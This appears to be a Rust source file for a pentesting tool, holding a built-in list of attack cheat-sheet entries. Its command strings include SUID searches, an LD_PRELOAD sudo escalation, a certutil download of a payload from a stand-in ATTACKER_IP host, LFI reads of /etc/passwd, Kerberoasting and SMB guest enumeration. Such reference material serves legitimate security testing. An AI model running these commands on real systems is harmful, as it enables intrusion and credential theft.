use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KnowledgeArticle {
    pub category: String,
    pub title: String,
    pub description: String,
    pub commands: Vec<String>,
    pub references: Vec<String>,
}

pub struct KnowledgeBase;

impl KnowledgeBase {
    pub fn get_builtins() -> Vec<KnowledgeArticle> {
        vec![
            KnowledgeArticle {
                category: "Linux Privilege Escalation".into(),
                title: "SUID / SGID Binary Escalation (GTFOBins)".into(),
                description: "Identify binaries with SUID permission set that allow arbitrary root execution.".into(),
                commands: vec![
                    "find / -perm -u=s -type f 2>/dev/null".into(),
                    "find / -perm -4000 -type f -ls 2>/dev/null".into(),
                ],
                references: vec!["https://gtfobins.github.io/".into()],
            },
            KnowledgeArticle {
                category: "Linux Privilege Escalation".into(),
                title: "Sudo Rights & Environment Overrides".into(),
                description: "Inspect allowed sudo permissions and environment preservation flags.".into(),
                commands: vec![
                    "sudo -l".into(),
                    "sudo LD_PRELOAD=/tmp/root.so /usr/bin/find".into(),
                ],
                references: vec!["https://book.hacktricks.xyz/linux-hardening/privilege-escalation".into()],
            },
            KnowledgeArticle {
                category: "Windows Privilege Escalation".into(),
                title: "Unquoted Service Paths & LOLBAS".into(),
                description: "Locate unquoted service paths writeable by low-privileged user contexts.".into(),
                commands: vec![
                    "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"".into(),
                    "certutil -urlcache -split -f http://ATTACKER_IP/payload.exe payload.exe".into(),
                ],
                references: vec![
                    "https://privesc.xyz/windows".into(),
                    "https://lolbas-project.github.io/".into(),
                ],
            },
            KnowledgeArticle {
                category: "Web Security".into(),
                title: "Local File Inclusion (LFI) & Filter Wrappers".into(),
                description: "Test path traversal payloads and PHP filter wrappers to read sensitive source code.".into(),
                commands: vec![
                    "curl -s \"http://TARGET/index.php?page=../../../../etc/passwd\"".into(),
                    "curl -s \"http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php\"".into(),
                ],
                references: vec![
                    "https://portswigger.net/web-security/file-path-traversal".into(),
                    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion".into(),
                ],
            },
            KnowledgeArticle {
                category: "Active Directory".into(),
                title: "Kerberoasting & AS-REP Roasting".into(),
                description: "Request TGS service tickets for SPN accounts and crack password hashes offline.".into(),
                commands: vec![
                    "GetUserSPNs.py -request -dc-ip TARGET_IP domain.local/user:pass".into(),
                    "GetNPUsers.py -request -format john -usersfile users.txt domain.local/".into(),
                ],
                references: vec!["https://book.hacktricks.xyz/windows-hardening/active-directory-attacks".into()],
            },
            KnowledgeArticle {
                category: "SMB Enumeration".into(),
                title: "SMB Share & Guest Access Audit".into(),
                description: "Enumerate guest/null SMB shares and list domain SID objects.".into(),
                commands: vec![
                    "smbclient -L //TARGET_IP -N".into(),
                    "crackmapexec smb TARGET_IP -u 'guest' -p '' --shares".into(),
                ],
                references: vec!["https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb".into()],
            },
        ]
    }
}
